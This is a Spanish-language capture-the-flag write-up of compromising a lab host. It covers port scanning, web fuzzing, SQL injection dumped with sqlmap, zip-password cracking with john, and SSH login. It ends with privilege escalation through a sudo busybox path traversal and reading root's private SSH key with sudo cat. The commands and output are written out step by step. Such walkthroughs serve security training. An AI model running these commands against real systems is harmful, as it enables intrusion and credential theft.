@@ -1,0 +1,246 @@
+
+# Enumeracion de Puertos, Servicios y Versiones
+
+nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 172.17.0.2 -oN nmap
+
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+|     Path: http://172.17.0.2:80/login.php
+|     Form id: username
+|     Form action: content_pages_hidden/db.php
+|     
+|     Path: http://172.17.0.2:80/register.php
+|     Form id: username
+|     Form action: content_pages_hidden/db_register.php
+|     
+|     Path: http://172.17.0.2:80/content_pages_hidden/db_register.php
+|     Form id: username
+|_    Form action: content_pages_hidden/db.php
+|_http-jsonp-detection: Couldn't find any JSONP endpoints.
+| http-enum: 
+|_  /login.php: Possible admin folder
+
+ya podemos ver varios directorios web desde el escaneo con nmap, aun asi, vamos a 
+hacer fuzzing
+
+# Fuzzing web
+
+gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -x php,txt,html,py,js,png,jpg -t 50
+
+===============================================================
+/login.php            (Status: 200) [Size: 1039]
+/register.php         (Status: 200) [Size: 1053]
+/index.php            (Status: 200) [Size: 4025]
+/.html                (Status: 403) [Size: 275]
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/.php                 (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+Progress: 1661144 / 1661152 (100.00%)
+===============================================================
+Finished
+
+al revisar el servicio web nos encontramos con lo que parece ser una web
+de desafios de hacking, por lo que se observa, podemos registrarno y asi
+lo hicimos, luego de iniciar sesion con el user que registramos, al final
+del todo nos conseguimos con un historico con la siguiente informacion:
+
+______________________________________________________________________________
+2024-08-14 10:23:45 - Usuario 'admin' inició sesión desde IP 192.168.1.105
+2024-08-14 10:25:17 - Usuario 'user123' completó el desafío de SQL Injection
+2024-08-14 10:30:52 - Usuario 'guest' falló al intentar iniciar sesión
+------------------------------------------------------------------------------
+
+como observamos, existe un usuario 'admin', y como despues de chequear no
+parece existir algo que nos pueda ayudar, realizare un ataque al login
+con el user 'admin'
+
+
+# Ataque de Diccionario a panel de login
+
+lo primero sera cerrar session e ir al panel de login: http://172.17.0.2/login.php
+una vez aqui, vamos a capturar una peticion con burpsuite:
+
+
+Peticion:____________________________________________________________________________
+
+POST /content_pages_hidden/db.php HTTP/1.1
+Host: 172.17.0.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+Origin: http://172.17.0.2
+Connection: keep-alive
+Referer: http://172.17.0.2/login.php
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=1234
+______________________________________________________________________________________
+
+enviamos la peticion al repeter para ver la respuesta y obtenemos como respuesta:
+
+____________________________________________________________________________________
+Consulta SQL: SELECT * FROM users WHERE username = 'admin' AND password = 'wfwv'<br>
+------------------------------------------------------------------------------------
+
+uy! yo pensaba en realizar un ataque de diccionario al login, pero me encuentro esto
+y ahora usaremos sqlmap para dumpear la informacion de la(s) base(s) de dato(s)
+
+
+# SQLMAP
+
+sqlmap -u http://172.17.0.2/login.php --dbs --forms --batch
+
+available databases [5]:
+[*] information_schema
+[*] injectors_db
+[*] mysql
+[*] performance_schema
+[*] sys
+
+hemos conseguido 5 bases de datos, asi que vamos ir examinando la informacion a ver que
+nos conseguimos:
+
+sqlmap -u http://172.17.0.2/login.php -D injectors_db --tables --forms --batch
+
+Database: injectors_db
+[1 table]
++-------+
+| users |
++-------+
+
+
+ahora dumpearemos las columnas de la tabla users en la db injectors_db
+
+sqlmap -u http://172.17.0.2/login.php -D injectors_db -T users --columns --forms --batch
+
+Database: injectors_db
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int         |
+| password | varchar(50) |
+| username | varchar(50) |
++----------+-------------+
+
+
+ahora vamos a traernos la informacion de las columnas: password y username que son las 
+que nos interesan
+
+sqlmap -u http://172.17.0.2/login.php -D injectors_db -T users -C password,username --dump --forms --batch
+
+Database: injectors_db
+Table: users
+[16 entries]
++-----------------------------+------------+
+| password                    | username   |
++-----------------------------+------------+
+| <blank>                     | <blank>    |
+| <blank>                     | <blank>    |
+| <blank>                     | ghz>hzx    |
+| <blank>                     | <blank>    |
+| <blank>                     | ghz>hzx    |
+| <blank>                     | <blank>    |
+| <blank>                     | <blank>    |
+| <blank>                     | <blank>    |
+| <blank>                     | <blank>    |
+| <blank>                     | <blank>    |
+| <blank>                     | <blank>    |
+| 1234                        | darksblack |
+| chicago123                  | jane       |
+| loveyou                     | root       |
+| no_mirar_en_este_directorio | ralf       |
+| password                    | admin      |
++-----------------------------+------------+
+
+
+ahora que conseguimos las credenciales, toca probarlas
+tras un rato no logro conseguir nada, pruebo las credencias
+por ssh pero tampoco, lo que si es interesante es la password
+del user ralf, y como la unica forma que tenemos actualmente 
+de llegar ver un directorio es por la web, probaremos esa password
+como un directorio a traves de la url, quedando asi:
+
+http://172.17.0.2/no_mirar_en_este_directorio
+
+y al acceder nos conseguimos un archivo .zip y lo descargamos
+
+curl -O http://172.17.0.2/no_mirar_en_este_directorio/secret.zip
+
+intentamos descomprimir pero tiene password, asi que intentare
+crackear
+
+zip2john secret.zip > hashzip
+john --wordlist=/home/darks/Desktop/linux/Kali/diccionarios/rockyou.txt hashzip
+computer         (secret.zip/confidencial.txt)     
+
+7z x secret.zip
+pass: computer
+cat confidencial.txt
+__________________________________________________________________________________
+You have to change your password ralf, I have told you many times, log into your 
+account and I will change your password.
+Your new credentials are:
+ralf:supersecurepassword
+----------------------------------------------------------------------------------
+
+traducimos:
+Tienes que cambiar tu contraseña ralf, te lo he dicho muchas veces, inicia sesión en tu 
+cuenta y cambiaré tu contraseña.
+Sus nuevas credenciales son:
+ralf:supersecurepassword
+
+esto pudieran ser credenciales ssh asi que intentamos
+
+ssh ralf@172.17.0.2
+pass:supersecurepassword
+
+>> accedimos <<
+
+# Escalada de Privilegios
+
+sudo -l
+    (capa : capa) NOPASSWD: /usr/local/bin/busybox /nothing/*
+
+sudo -u capa /usr/local/bin/busybox /nothing/../usr/bin/sh
+whoami
+capa
+
+------------------
+somo el user capa|
+------------------
+
+cd ~
+ls
+passwd.txt
+cat passwd.txt
+capa:capaelmejor
+
+parece que hemos conseguido las credenciales del user capa
+
+sudo -l
+
+    (ALL : ALL) NOPASSWD: /bin/cat
+
+ya que tenemos cat, esto significa que vamos a poder leer cualquier archivo
+por lo que vamos a leer la llave privada ssh de root 
+
+sudo /bin/cat /root/.ssh/id_rsa
+
+
+copiamos su contenido tal cual y creamos un id_rsa en nuestra maquina
+atacante y le gestinamos los permisos para que pueda funcionar
+
+chmod og-wrx id_rsa
+
+ya con la llave id_rsa nos conectamos a root via ssh sin necesidad de 
+una password
+
+ssh root@172.17.0.2 -i id_rsa
+
+# root
